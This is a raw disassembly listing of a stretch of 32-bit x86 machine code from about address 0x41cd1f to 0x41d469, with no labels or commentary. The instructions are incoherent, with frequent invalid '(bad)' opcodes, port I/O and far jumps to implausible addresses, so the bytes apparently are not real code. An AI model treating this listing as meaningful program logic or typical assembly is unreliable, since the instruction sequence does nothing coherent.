  41cd1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd20:	inc    edi
  41cd21:	test   edx,esp
  41cd23:	test   dl,dl
  41cd25:	jo     0x41cd6a
  41cd27:	sbb    BYTE PTR fs:[edx],ch
  41cd2a:	shl    DWORD PTR [ebp-0x1e],cl
  41cd2d:	sub    BYTE PTR [ecx+ebx*2],bl
  41cd30:	sbb    dl,BYTE PTR [edx-0x3a]
  41cd33:	push   esp
  41cd34:	cmp    BYTE PTR [ebp-0x42],bh
  41cd37:	dec    esi
  41cd38:	in     al,dx
  41cd39:	jbe    0x41cd6e
  41cd3b:	scas   al,BYTE PTR es:[edi]
  41cd3c:	les    edx,FWORD PTR [esi-0x44]
  41cd3f:	not    bh
  41cd41:	dec    edx
  41cd42:	inc    edx
  41cd43:	and    eax,0xb9c5031e
  41cd48:	fld    TBYTE PTR [esi+0x1ea6b63e]
  41cd4e:	iret   
  41cd4f:	or     BYTE PTR [edi+0x46],dh
  41cd52:	dec    eax
  41cd53:	pop    esp
  41cd54:	mov    dl,al
  41cd56:	repnz xchg edi,eax
  41cd58:	into   
  41cd59:	sbb    al,BYTE PTR [edi+esi*4+0x62]
  41cd5d:	sahf   
  41cd5e:	fsubr  QWORD PTR [esi]
  41cd60:	ret    0x4b9b
  41cd63:	push   0x71
  41cd65:	shl    BYTE PTR [esi+0x53],0x5d
  41cd69:	mov    edi,0x8779f17b
  41cd6e:	sbb    ch,BYTE PTR [esp+edx*2+0x74]
  41cd72:	lods   al,BYTE PTR ds:[esi]
  41cd73:	in     eax,dx
  41cd74:	or     edi,DWORD PTR [ecx-0x51]
  41cd77:	jle    0x41cd3c
  41cd79:	(bad)  
  41cd7a:	aad    0xca
  41cd7c:	pop    ecx
  41cd7d:	and    BYTE PTR [esp+edi*8],al
  41cd80:	lods   al,BYTE PTR ds:[esi]
  41cd81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd83:	stos   BYTE PTR es:[edi],al
  41cd84:	fnstsw WORD PTR [eax-0x2d]
  41cd87:	fwait
  41cd88:	dec    ebp
  41cd89:	add    al,0x62
  41cd8b:	jmp    FWORD PTR [eax+edi*8-0x2e]
  41cd8f:	stos   BYTE PTR es:[edi],al
  41cd90:	out    0xa,eax
  41cd92:	xor    BYTE PTR [ebp-0x3874b816],cl
  41cd98:	push   es
  41cd99:	push   edi
  41cd9a:	sub    eax,0x36324d88
  41cd9f:	sar    DWORD PTR [ebx+edi*1-0x2b],cl
  41cda3:	out    0x49,al
  41cda5:	cmp    al,0xce
  41cda7:	dec    ebx
  41cda8:	mov    bh,0xba
  41cdaa:	fldcw  WORD PTR [esi]
  41cdac:	(bad)  
  41cdad:	fldcw  WORD PTR [ebx]
  41cdaf:	(bad)  
  41cdb0:	sub    al,0xa5
  41cdb2:	pop    edi
  41cdb3:	into   
  41cdb4:	xor    bl,BYTE PTR [esi]
  41cdb6:	sub    esp,ebp
  41cdb8:	mov    ebx,0x1b06b2c2
  41cdbd:	cmp    al,0xf8
  41cdbf:	out    0x27,eax
  41cdc1:	cwde   
  41cdc2:	cdq    
  41cdc3:	mov    ds,WORD PTR [edx]
  41cdc5:	inc    ebp
  41cdc6:	mov    edi,0xa243a5f3
  41cdcb:	and    ah,cl
  41cdcd:	fild   WORD PTR [ebx+0x6bf1c3be]
  41cdd3:	pusha  
  41cdd4:	fs cmc 
  41cdd6:	xor    eax,0xfd08dda2
  41cddb:	and    BYTE PTR [edi+0x68],al
  41cdde:	mov    ebp,?
  41cde0:	xchg   ebp,eax
  41cde1:	jb     0x41cdc6
  41cde3:	cmp    cl,BYTE PTR [ebp-0x43]
  41cde6:	push   cs
  41cde7:	test   eax,0x1459c076
  41cdec:	stos   DWORD PTR es:[edi],eax
  41cded:	mov    ebp,0x5aba9ef
  41cdf2:	mov    ds:0x1ff881a8,al
  41cdf7:	jnp    0x41cdeb
  41cdf9:	and    al,bl
  41cdfb:	rcr    BYTE PTR [edi],0x1e
  41cdfe:	cmc    
  41cdff:	and    bh,BYTE PTR [ebx-0x31319098]
  41ce05:	ss ins DWORD PTR es:[edi],dx
  41ce07:	pop    edi
  41ce08:	out    dx,al
  41ce09:	push   ebx
  41ce0a:	xchg   BYTE PTR [ecx-0x368ff5e8],al
  41ce10:	cwde   
  41ce11:	pop    edi
  41ce12:	repnz push es
  41ce14:	js     0x41cd9a
  41ce16:	dec    edi
  41ce17:	inc    esi
  41ce18:	xor    DWORD PTR [esi-0x39aa0645],ebp
  41ce1e:	inc    esi
  41ce1f:	addr16 loop 0x41ce19
  41ce22:	mov    esp,0xfd99a855
  41ce27:	sahf   
  41ce28:	cmp    al,0xf3
  41ce2a:	cmp    eax,0x2c72f8a2
  41ce2f:	xchg   ebp,eax
  41ce30:	push   esp
  41ce31:	sbb    al,0xfe
  41ce33:	inc    ebp
  41ce34:	out    0xcc,eax
  41ce36:	xchg   ebp,eax
  41ce37:	enter  0xfc7b,0x6e
  41ce3b:	adc    esi,DWORD PTR [edi-0x5a4f5267]
  41ce41:	sahf   
  41ce42:	pushf  
  41ce43:	push   es
  41ce44:	push   cs
  41ce45:	dec    edi
  41ce46:	sub    eax,0x45888c27
  41ce4b:	push   ebx
  41ce4c:	xor    BYTE PTR [ecx+0x7b],ah
  41ce4f:	out    dx,eax
  41ce50:	lods   eax,DWORD PTR ds:[esi]
  41ce51:	mov    edx,0xd5e2adc4
  41ce56:	dec    ebx
  41ce57:	and    edx,eax
  41ce59:	rol    BYTE PTR [edx-0x6ef171ee],0xef
  41ce60:	mov    edx,0xd639a9d9
  41ce65:	xchg   edi,eax
  41ce66:	aas    
  41ce67:	pusha  
  41ce68:	xchg   DWORD PTR [ebx+0x7a776dcf],esi
  41ce6e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41ce70:	outs   dx,DWORD PTR ds:[esi]
  41ce71:	dec    edi
  41ce72:	imul   ebx,ebx,0xb1c031ec
  41ce78:	jg     0x41ce11
  41ce7a:	sub    DWORD PTR [eax-0x16],esp
  41ce7d:	xchg   esp,eax
  41ce7e:	(bad)  
  41ce7f:	pop    ebx
  41ce80:	das    
  41ce81:	mov    eax,ds:0x87934528
  41ce86:	(bad)  
  41ce87:	mov    edx,0x70aa47a3
  41ce8c:	loopne 0x41ce18
  41ce8e:	das    
  41ce8f:	popf   
  41ce90:	les    ebx,FWORD PTR [ecx+edx*8+0x68]
  41ce94:	inc    esp
  41ce95:	add    edi,eax
  41ce97:	sbb    al,BYTE PTR [ebp+0x365d73e1]
  41ce9d:	pusha  
  41ce9e:	xchg   BYTE PTR [ebx-0x17a761b4],cl
  41cea4:	add    ch,bh
  41cea6:	adc    ebx,ecx
  41cea8:	mov    dh,0x13
  41ceaa:	push   ebx
  41ceab:	fcom   DWORD PTR [esi+0x584ad7d0]
  41ceb1:	sub    BYTE PTR [edx],bl
  41ceb3:	pop    edi
  41ceb4:	dec    edi
  41ceb5:	sub    al,0xc7
  41ceb7:	sar    BYTE PTR [ecx],cl
  41ceb9:	ja     0x41cec1
  41cebb:	add    DWORD PTR [ebx],0xffffffd7
  41cebe:	or     DWORD PTR [edi-0x29],edx
  41cec1:	dec    esp
  41cec2:	sub    ebp,esp
  41cec4:	fadd   QWORD PTR [eax-0x6d]
  41cec7:	and    BYTE PTR [ebp-0x7e],dl
  41ceca:	xlat   BYTE PTR ds:[ebx]
  41cecb:	adc    ch,dh
  41cecd:	and    ebx,edi
  41cecf:	adc    eax,DWORD PTR [eax+0xfea15a9]
  41ced5:	popf   
  41ced6:	cmp    DWORD PTR [edi-0x26],edi
  41ced9:	(bad)  
  41ceda:	int3   
  41cedb:	cmp    edx,DWORD PTR [ebp+0x5d75420a]
  41cee1:	push   edi
  41cee2:	js     0x41cf15
  41cee4:	adc    eax,0xb7a70595
  41cee9:	pop    edi
  41ceea:	push   eax
  41ceeb:	pop    ds
  41ceec:	xchg   edi,eax
  41ceed:	push   esi
  41ceee:	je     0x41cedf
  41cef0:	sub    DWORD PTR [edx-0x3d],0xffffffda
  41cef4:	xchg   DWORD PTR [ebx-0x7e3d5c6a],edi
  41cefa:	pop    esi
  41cefb:	out    0x7e,eax
  41cefd:	fimul  WORD PTR [ebp+0x119ee6b6]
  41cf03:	adc    BYTE PTR [esi+0x6317982],0x2a
  41cf0a:	or     eax,0x7bae54a1
  41cf0f:	fadd   QWORD PTR [esi-0x38911759]
  41cf15:	test   BYTE PTR ds:0xbd1c90,dl
  41cf1b:	(bad)
  41cf1f:	and    dl,ch
  41cf21:	jae    0x41ceeb
  41cf23:	jo     0x41cec4
  41cf25:	imul   ecx,DWORD PTR es:[ebx+0x36],0x95676bfb
  41cf2d:	shr    BYTE PTR [edx+0x5a51358],0x95
  41cf34:	push   edi
  41cf35:	xchg   esi,eax
  41cf36:	and    DWORD PTR ds:0xf9115113,esi
  41cf3c:	je     0x41cf4d
  41cf3e:	or     esp,ebx
  41cf40:	int    0xd0
  41cf42:	jo     0x41cf86
  41cf44:	cmp    DWORD PTR [edx-0x1a],esi
  41cf47:	popf   
  41cf48:	in     al,dx
  41cf49:	cmp    al,0x2f
  41cf4b:	imul   ebp,DWORD PTR [ecx],0x59a4dba5
  41cf51:	dec    edx
  41cf52:	(bad)  
  41cf53:	jae    0x41cf53
  41cf55:	int3   
  41cf56:	jl     0x41cf1a
  41cf58:	and    al,0x78
  41cf5a:	mov    DWORD PTR [ebx+0xb],ebx
  41cf5d:	inc    ebp
  41cf5e:	pushf  
  41cf5f:	adc    BYTE PTR [ebx-0x2c],ah
  41cf62:	test   BYTE PTR [edi-0x211e14c],ch
  41cf68:	xchg   ebp,eax
  41cf69:	jg     0x41ceee
  41cf6b:	inc    ebp
  41cf6c:	mov    ebx,0xa37447c3
  41cf71:	mov    ebp,0xb2d05fdf
  41cf76:	mov    ebp,0x55348d15
  41cf7b:	lods   al,BYTE PTR ds:[esi]
  41cf7c:	mov    ebp,0xfbdee7e6
  41cf81:	or     ebx,ecx
  41cf83:	shl    ebp,1
  41cf85:	popf   
  41cf86:	cli    
  41cf87:	push   DWORD PTR [edx]
  41cf89:	clc    
  41cf8a:	mov    dl,BYTE PTR [edi]
  41cf8c:	sbb    eax,0xd9e28243
  41cf91:	adc    al,0x2a
  41cf93:	aad    0x90
  41cf95:	lods   eax,DWORD PTR ds:[esi]
  41cf96:	jg     0x41cfb1
  41cf98:	loop   0x41cfa5
  41cf9a:	(bad)  
  41cf9b:	out    0xa6,al
  41cf9d:	xchg   edx,ecx
  41cf9f:	(bad)  
  41cfa0:	cli    
  41cfa1:	(bad)  
  41cfa2:	jmp    0x41d01c
  41cfa4:	xchg   edi,eax
  41cfa5:	cli    
  41cfa6:	cmc    
  41cfa7:	loope  0x41cf35
  41cfa9:	sbb    eax,0x9e6322b4
  41cfae:	inc    ecx
  41cfaf:	scas   al,BYTE PTR es:[edi]
  41cfb0:	dec    ebx
  41cfb1:	out    dx,al
  41cfb2:	xchg   DWORD PTR [ecx+ebp*8-0x4f891b0a],ebx
  41cfb9:	stos   BYTE PTR es:[edi],al
  41cfba:	pop    esp
  41cfbb:	(bad)  
  41cfbc:	dec    BYTE PTR [edi-0x750d247c]
  41cfc2:	and    ah,dl
  41cfc4:	xor    dl,BYTE PTR [ecx]
  41cfc6:	jmp    0x2a33440
  41cfcb:	dec    ebp
  41cfcc:	nop
  41cfcd:	outs   dx,BYTE PTR ds:[esi]
  41cfce:	retfw  
  41cfd0:	push   ebp
  41cfd1:	add    al,0x4b
  41cfd3:	or     DWORD PTR ss:[ecx+0x47a021d7],ecx
  41cfda:	pop    ebp
  41cfdb:	enter  0x540,0x70
  41cfdf:	sahf   
  41cfe0:	jne    0x41cfbe
  41cfe2:	dec    edx
  41cfe3:	out    0x77,eax
  41cfe5:	pop    ss
  41cfe6:	xchg   edi,eax
  41cfe7:	out    dx,al
  41cfe8:	js     0x41cfb9
  41cfea:	pop    eax
  41cfeb:	cmp    al,0x72
  41cfed:	sbb    eax,0x48de4260
  41cff2:	test   al,0xc3
  41cff4:	cmp    DWORD PTR [ebx-0x34],edx
  41cff7:	mov    ch,0xa9
  41cff9:	into   
  41cffa:	fcom   DWORD PTR [esi]
  41cffc:	hlt    
  41cffd:	sub    BYTE PTR [ebx+0xe],bh
  41d000:	loopne 0x41cfc2
  41d002:	rcr    BYTE PTR [edx+eiz*1+0x34],1
  41d006:	mov    al,BYTE PTR ds:0x27570183
  41d00c:	and    BYTE PTR [edi-0x5678dddb],dl
  41d012:	mov    edx,0x4a62dd6
  41d017:	or     DWORD PTR [ebx],0xffffffe7
  41d01a:	sti    
  41d01b:	jmp    0x8d5d:0xcd25ede0
  41d022:	cld    
  41d023:	xlat   BYTE PTR ds:[ebx]
  41d024:	sub    eax,0x8222e85d
  41d029:	adc    ah,BYTE PTR [ebp-0x57]
  41d02c:	push   ds
  41d02d:	sbb    al,0x9f
  41d02f:	pop    edi
  41d030:	repnz xchg ebp,eax
  41d032:	dec    edi
  41d033:	in     eax,0xf6
  41d035:	push   es
  41d036:	xchg   ebx,eax
  41d037:	cmovp  ebx,DWORD PTR [eax-0xc]
  41d03b:	jp     0x41d090
  41d03d:	adc    al,ch
  41d03f:	mov    dh,0x1d
  41d041:	dec    ecx
  41d042:	in     al,0xb6
  41d044:	inc    ax
  41d046:	jg     0x41cfca
  41d048:	test   DWORD PTR [ebx+0x5963969],ebx
  41d04e:	aaa    
  41d04f:	jmp    0x52b116dc
  41d054:	lahf   
  41d055:	add    DWORD PTR [ebx],edi
  41d057:	int3   
  41d058:	xchg   esp,eax
  41d059:	xlat   BYTE PTR ds:[ebx]
  41d05a:	sti    
  41d05b:	mov    eax,ds:0x119d92f8
  41d060:	jle    0x41d0c7
  41d062:	mov    dl,0x54
  41d064:	arpl   cx,si
  41d066:	shr    BYTE PTR [esi],1
  41d068:	ds cwde 
  41d06a:	and    BYTE PTR cs:[edx],al
  41d06d:	and    eax,0x680d5aef
  41d072:	call   0x7fb3:0x7d2a7efe
  41d079:	scas   eax,DWORD PTR es:[edi]
  41d07a:	sbb    al,0x62
  41d07c:	mov    bh,0x50
  41d07e:	fistp  DWORD PTR [ecx-0x3166f887]
  41d084:	sbb    eax,0x570288ea
  41d089:	pop    ebx
  41d08a:	in     al,dx
  41d08b:	xchg   ebp,eax
  41d08c:	inc    esp
  41d08d:	ja     0x41d0cd
  41d08f:	in     eax,0x5
  41d091:	adc    eax,0xfffffff9
  41d094:	pop    edx
  41d095:	fld    TBYTE PTR [esi+0x2d6825c]
  41d09b:	idiv   dh
  41d09d:	test   DWORD PTR ds:0x22ed9da0,ebp
  41d0a3:	dec    esp
  41d0a4:	mov    dh,0xd
  41d0a6:	mov    al,0xae
  41d0a8:	xor    bl,ch
  41d0aa:	pushf  
  41d0ab:	push   edx
  41d0ac:	jg     0x41d0f1
  41d0ae:	test   al,0x20
  41d0b0:	pop    es
  41d0b1:	pop    ebx
  41d0b2:	lock cs repz (bad) 
  41d0b6:	outs   dx,BYTE PTR ds:[esi]
  41d0b7:	and    DWORD PTR [ecx+ebx*2+0x51],eax
  41d0bb:	add    DWORD PTR [ebp-0xc],eax
  41d0be:	shr    esp,cl
  41d0c0:	adc    eax,0xe2ce6805
  41d0c5:	pusha  
  41d0c6:	rcl    DWORD PTR [esi-0x1453883f],0xb7
  41d0cd:	leave  
  41d0ce:	pop    esi
  41d0cf:	pop    ds
  41d0d0:	sbb    DWORD PTR [edi+0x1a],ebx
  41d0d3:	xchg   BYTE PTR [eax-0x7e],dl
  41d0d6:	cmp    BYTE PTR [eax],al
  41d0d8:	push   edi
  41d0d9:	cmp    al,0xc8
  41d0db:	push   0x6f128971
  41d0e0:	cld    
  41d0e1:	test   ebx,eax
  41d0e3:	call   0x37ba0fc2
  41d0e8:	call   DWORD PTR [ebx]
  41d0ea:	ds (bad) 
  41d0ec:	xchg   ebp,eax
  41d0ed:	icebp  
  41d0ee:	adc    eax,0x407111cd
  41d0f3:	cmp    al,0xe5
  41d0f5:	jae    0x41d105
  41d0f7:	js     0x41d0ab
  41d0f9:	xor    DWORD PTR [ecx],ebx
  41d0fb:	pop    ebp
  41d0fc:	mov    ah,0xc
  41d0fe:	inc    edi
  41d0ff:	pop    edi
  41d100:	daa    
  41d101:	add    al,0xbe
  41d103:	dec    edi
  41d104:	ret    
  41d105:	ins    DWORD PTR es:[edi],dx
  41d106:	iret   
  41d107:	xchg   edi,eax
  41d108:	and    edx,DWORD PTR [ebx-0x1d5b2449]
  41d10e:	mov    ds:0x52c9f852,eax
  41d113:	or     al,0x4
  41d115:	pop    esp
  41d116:	cld    
  41d117:	lods   eax,DWORD PTR ds:[esi]
  41d118:	out    0x9e,al
  41d11a:	or     ebp,esi
  41d11c:	shr    cl,1
  41d11e:	mov    ch,0x67
  41d120:	sbb    cl,BYTE PTR ds:0x6b806c81
  41d126:	sar    al,cl
  41d128:	shl    DWORD PTR [ebx+edx*4-0x43],1
  41d12c:	adc    cx,dx
  41d12f:	div    BYTE PTR [edi+0x69]
  41d132:	test   DWORD PTR [eax+edx*1],esp
  41d135:	rol    BYTE PTR [esi],cl
  41d137:	ins    BYTE PTR es:[edi],dx
  41d138:	or     al,BYTE PTR ds:0x1997fb30
  41d13e:	sub    cl,BYTE PTR ds:0xb06f89dc
  41d144:	sbb    BYTE PTR [esp+0x65521b86],0xf3
  41d14c:	shl    DWORD PTR [ebp+0x3dd5a63e],cl
  41d152:	push   esi
  41d153:	stc    
  41d154:	icebp  
  41d155:	fnstcw WORD PTR [ebp+0x357d7984]
  41d15b:	inc    ecx
  41d15c:	out    0x17,eax
  41d15e:	imul   edx,DWORD PTR [esi-0x36],0x44d2404
  41d165:	bound  eax,QWORD PTR ds:0xa4b8fb3
  41d16b:	int    0x8d
  41d16d:	mov    esi,0x6c3cf270
  41d172:	cld    
  41d173:	arpl   WORD PTR [edx+0x211020e9],si
  41d179:	mov    WORD PTR [ebp+0x78],?
  41d17c:	pop    edi
  41d17d:	dec    esi
  41d17e:	ins    DWORD PTR es:[edi],dx
  41d17f:	pop    es
  41d180:	nop
  41d181:	lock xchg esi,eax
  41d183:	outs   dx,DWORD PTR ds:[esi]
  41d184:	and    BYTE PTR [eax],0xb0
  41d187:	lea    edi,[ecx]
  41d189:	dec    ebx
  41d18a:	jb     0x41d147
  41d18c:	inc    ebp
  41d18d:	cmp    DWORD PTR [edx+0x3d],esi
  41d190:	jmp    0x41d16d
  41d192:	sti    
  41d193:	fwait
  41d194:	add    dl,BYTE PTR [edi+0x42]
  41d197:	inc    ebx
  41d198:	lods   al,BYTE PTR ds:[esi]
  41d199:	retf   
  41d19a:	ins    DWORD PTR es:[edi],dx
  41d19b:	inc    eax
  41d19c:	stos   DWORD PTR es:[edi],eax
  41d19d:	arpl   WORD PTR [ebp*4-0x56da8856],bp
  41d1a4:	icebp  
  41d1a5:	push   0x1e173fcf
  41d1aa:	aam    0x34
  41d1ac:	pushf  
  41d1ad:	aaa    
  41d1ae:	mov    al,ds:0x8dd5dbec
  41d1b3:	push   ds
  41d1b4:	mov    ebp,0xd0f9b8b1
  41d1b9:	sbb    ah,dh
  41d1bb:	inc    ebx
  41d1bc:	in     al,0x20
  41d1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1bf:	hlt    
  41d1c0:	sbb    BYTE PTR [ebx-0x77],dh
  41d1c3:	fbld   TBYTE PTR [edi+ebp*2]
  41d1c6:	sub    DWORD PTR [edi],ebp
  41d1c8:	xor    DWORD PTR [esp+ecx*8],0x80d4ef3d
  41d1cf:	mov    gs,WORD PTR [edx+edi*1]
  41d1d2:	jge    0x41d1ce
  41d1d4:	loopne 0x41d244
  41d1d6:	sbb    DWORD PTR [edx-0x7c391b9d],edi
  41d1dc:	fwait
  41d1dd:	mov    al,ds:0xd6c3bdbc
  41d1e2:	mov    cl,BYTE PTR [ebp-0x457abedc]
  41d1e8:	imul   ebx,DWORD PTR [ecx-0x64],0xffffffcb
  41d1ec:	(bad)  
  41d1ed:	push   edx
  41d1ee:	push   0x54b18715
  41d1f3:	fstp   TBYTE PTR [eax]
  41d1f5:	retf   0x36af
  41d1f8:	adc    eax,0xdf11833e
  41d1fd:	scas   al,BYTE PTR es:[edi]
  41d1fe:	xchg   esp,eax
  41d1ff:	in     al,0xfb
  41d201:	pop    ds
  41d202:	push   esp
  41d203:	xor    BYTE PTR [esp+edx*2+0x31773960],0x67
  41d20b:	mov    al,0x28
  41d20d:	sub    eax,DWORD PTR [ebp+0x62659908]
  41d213:	add    edx,DWORD PTR [edx]
  41d215:	xor    BYTE PTR [eax+0x35],0x8f
  41d219:	inc    edi
  41d21a:	cdq    
  41d21b:	add    DWORD PTR [esi],ebx
  41d21d:	jns    0x41d1d0
  41d21f:	mov    bl,0x93
  41d221:	fist   DWORD PTR [eax+0x78]
  41d224:	and    DWORD PTR [edx+0x6dc86bd6],esp
  41d22a:	sub    eax,0x65856972
  41d22f:	(bad)  
  41d230:	push   0x1aa2dad7
  41d235:	and    esp,DWORD PTR [edx+0x30]
  41d238:	(bad)  
  41d239:	mov    ebp,0x199be59a
  41d23e:	mov    dl,0x96
  41d240:	(bad)  
  41d241:	jge    0x41d29e
  41d243:	mov    ebx,0xc4abba05
  41d248:	test   eax,edx
  41d24a:	jl     0x41d224
  41d24c:	out    dx,al
  41d24d:	inc    ecx
  41d24e:	add    dh,BYTE PTR [esp+edx*4+0x23a442de]
  41d255:	les    edi,FWORD PTR [edi]
  41d257:	ins    DWORD PTR es:[edi],dx
  41d258:	sub    BYTE PTR [eax+0x4f57b207],cl
  41d25e:	lahf   
  41d25f:	ins    DWORD PTR es:[edi],dx
  41d260:	adc    eax,0xd20fcdcf
  41d265:	in     eax,dx
  41d266:	sbb    al,0x3c
  41d268:	xor    al,0x81
  41d26a:	xor    DWORD PTR ds:0x800068b2,0xffffffa9
  41d271:	and    ebp,esi
  41d273:	push   esp
  41d274:	pop    ebx
  41d275:	mov    esp,0xee2fc567
  41d27a:	xchg   BYTE PTR [esi+0x3c],cl
  41d27d:	pop    ds
  41d27e:	dec    eax
  41d27f:	or     eax,0x61e0cdca
  41d284:	stc    
  41d285:	(bad)  
  41d286:	xlat   BYTE PTR ds:[ebx]
  41d287:	adc    eax,0xe9c4afe9
  41d28c:	pop    ecx
  41d28d:	loope  0x41d26d
  41d28f:	inc    edi
  41d290:	daa    
  41d291:	dec    eax
  41d292:	mov    esp,0xa863bf74
  41d297:	jp     0x41d236
  41d299:	or     bh,cl
  41d29b:	int    0x2e
  41d29d:	aas    
  41d29e:	out    dx,al
  41d29f:	inc    esi
  41d2a0:	sbb    BYTE PTR [edi+0x64],bh
  41d2a3:	das    
  41d2a4:	cdq    
  41d2a5:	(bad)  
  41d2a6:	sub    al,0x1c
  41d2a8:	mov    ds:0x44abdabd,eax
  41d2ad:	adc    DWORD PTR [eax+0x21c97a02],esi
  41d2b3:	mov    cl,0x91
  41d2b5:	loope  0x41d2a2
  41d2b7:	dec    eax
  41d2b8:	adc    BYTE PTR [edi],ah
  41d2ba:	jns    0x41d2e2
  41d2bc:	mov    dh,0x84
  41d2be:	cmp    esi,edi
  41d2c0:	jg     0x41d25c
  41d2c2:	sahf   
  41d2c3:	div    BYTE PTR [eax-0x57c420f3]
  41d2c9:	jmp    0x41d2f8
  41d2cb:	aam    0xbf
  41d2cd:	jne    0x41d258
  41d2cf:	lahf   
  41d2d0:	xchg   BYTE PTR [eax+0x50],cl
  41d2d3:	test   eax,0x33ace86f
  41d2d8:	jns    0x41d31e
  41d2da:	mov    ebp,0x1d523766
  41d2df:	out    dx,eax
  41d2e0:	cli    
  41d2e1:	jns    0x41d26d
  41d2e3:	cmp    al,0x72
  41d2e5:	push   esp
  41d2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2e7:	and    BYTE PTR [eax+eax*2],ah
  41d2ea:	xchg   DWORD PTR [ebx-0x1c],edx
  41d2ed:	stc    
  41d2ee:	cmp    edi,ecx
  41d2f0:	psrld  mm4,QWORD PTR [eax+0x5294d0ee]
  41d2f7:	sub    eax,0xc58766f8
  41d2fc:	or     DWORD PTR [ebx-0x11007a65],eax
  41d302:	push   ebx
  41d303:	or     ebp,edx
  41d305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d306:	dec    edi
  41d307:	pop    edi
  41d308:	and    BYTE PTR [edx+0x3a7abd1d],cl
  41d30e:	mov    edx,0xb0c59a7f
  41d313:	jns    0x41d297
  41d315:	retf   0x6ce4
  41d318:	jg     0x41d36b
  41d31a:	push   es
  41d31b:	and    al,0x18
  41d31d:	inc    edx
  41d31e:	adc    ebx,0xc88c9f48
  41d324:	fcomip st,st(4)
  41d326:	add    eax,0x7677bd04
  41d32b:	and    BYTE PTR [ebx+0x24e90471],dh
  41d331:	jb     0x41d2c0
  41d333:	sub    ebp,DWORD PTR [esp+eax*4]
  41d336:	pop    edx
  41d337:	mov    ebp,gs
  41d339:	imul   esp,esp,0x6e5707b1
  41d33f:	xor    BYTE PTR [edx+0x123f7107],bl
  41d345:	and    al,0x5f
  41d347:	scas   eax,DWORD PTR es:[edi]
  41d348:	adc    dh,BYTE PTR [ebx+0x29]
  41d34b:	cmp    DWORD PTR [ebx],esi
  41d34d:	sub    DWORD PTR [ebp+0x3f],ebp
  41d350:	mov    ebp,0x951f7385
  41d355:	or     eax,0x7d783ef1
  41d35a:	lock out 0x70,eax
  41d35d:	jns    0x41d2ef
  41d35f:	fild   DWORD PTR [ecx+0x41]
  41d362:	stc    
  41d363:	lods   al,BYTE PTR ds:[esi]
  41d364:	push   0x68
  41d366:	call   0x5cf6:0x8f603264
  41d36d:	xor    dh,BYTE PTR [esi+0x182ce4a]
  41d373:	xor    al,0xdd
  41d375:	(bad)  [esp+eax*2-0x36d9135b]
  41d37c:	imul   edi,DWORD PTR [ebx+ecx*8+0x26],0xffffff84
  41d381:	jmp    0xb4215556
  41d386:	outs   dx,DWORD PTR ds:[esi]
  41d387:	scas   al,BYTE PTR es:[edi]
  41d388:	in     al,dx
  41d389:	push   esp
  41d38a:	fcmovnu st,st(6)
  41d38c:	jp     0x41d3b2
  41d38e:	ins    DWORD PTR es:[edi],dx
  41d38f:	loopne 0x41d39b
  41d391:	les    ecx,FWORD PTR ss:[edx+0x0]
  41d395:	fwait
  41d396:	and    al,0x44
  41d398:	xchg   edi,eax
  41d399:	(bad)  
  41d39a:	and    ch,dh
  41d39c:	and    edx,edx
  41d39e:	cmp    BYTE PTR [ebx],al
  41d3a0:	sahf   
  41d3a1:	cmc    
  41d3a2:	mov    eax,ds:0xce1c4030
  41d3a7:	mov    edi,0xb692a62a
  41d3ac:	clc    
  41d3ad:	ror    DWORD PTR ds:0x70ccc9b8,0xfe
  41d3b4:	cli    
  41d3b5:	adc    al,0xe4
  41d3b7:	popa   
  41d3b8:	push   0xffffffa1
  41d3ba:	imul   edx,DWORD PTR [edx],0xc6c03a96
  41d3c0:	jl     0x41d35c
  41d3c2:	dec    ebx
  41d3c3:	outs   dx,DWORD PTR ds:[esi]
  41d3c4:	mov    al,0x32
  41d3c6:	mov    eax,0x38a09272
  41d3cb:	push   ebp
  41d3cc:	add    eax,0xee692a78
  41d3d1:	in     al,0xc8
  41d3d3:	push   ebx
  41d3d4:	mov    esp,0x1d0a04ed
  41d3d9:	sub    BYTE PTR [edx],0x5a
  41d3dc:	into   
  41d3dd:	xchg   BYTE PTR [eax+0x5c2495bf],ah
  41d3e3:	icebp  
  41d3e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3e5:	sbb    dl,0x82
  41d3e8:	fisubr DWORD PTR [ecx]
  41d3ea:	clc    
  41d3eb:	add    cl,bh
  41d3ed:	loope  0x41d38e
  41d3ef:	or     ebp,DWORD PTR [ebx+0x79778981]
  41d3f5:	pushf  
  41d3f6:	sbb    ecx,DWORD PTR [ebx]
  41d3f8:	mov    eax,ds:0xf5a2bd7c
  41d3fd:	sbb    eax,0x1300c003
  41d402:	rcr    bl,cl
  41d404:	xchg   esi,eax
  41d405:	ret    
  41d406:	addr16 inc esi
  41d408:	add    eax,0xf40c96c
  41d40d:	repz mov gs,WORD PTR ds:0x1d203122
  41d414:	add    ch,BYTE PTR [ebx+eiz*4]
  41d417:	loop   0x41d3f3
  41d419:	xchg   esi,eax
  41d41a:	sbb    eax,0x25efd015
  41d41f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d421:	push   esp
  41d422:	xchg   esi,eax
  41d423:	mov    edx,DWORD PTR [ebx+0x1e]
  41d426:	inc    esi
  41d427:	jl     0x41d49c
  41d429:	jns    0x41d435
  41d42b:	lods   al,BYTE PTR ds:[esi]
  41d42c:	jmp    0xcc6ce9b9
  41d431:	add    esp,DWORD PTR [eax+0x1b9f97ba]
  41d437:	ficom  DWORD PTR [ecx]
  41d439:	sub    DWORD PTR [esi],ecx
  41d43b:	cmp    al,0x26
  41d43d:	arpl   bx,dx
  41d43f:	lds    esi,FWORD PTR [ebp+0x49]
  41d442:	loopne 0x41d433
  41d444:	add    dh,BYTE PTR [ebp-0x5057bf1f]
  41d44a:	pop    esi
  41d44b:	mov    eax,0xd369ccce
  41d450:	jae    0x41d4b6
  41d452:	scas   eax,DWORD PTR es:[di]
  41d454:	fstp   QWORD PTR ds:0x4098ad9b
  41d45a:	(bad)  
  41d45b:	mov    ds:0xbd159d2b,eax
  41d460:	lea    edi,[ecx]
  41d462:	popf   
  41d463:	stos   BYTE PTR es:[edi],al
  41d464:	pop    ebx
  41d465:	cmp    al,0xf
  41d467:	cmp    esp,ebp
  41d469:	dec    esp
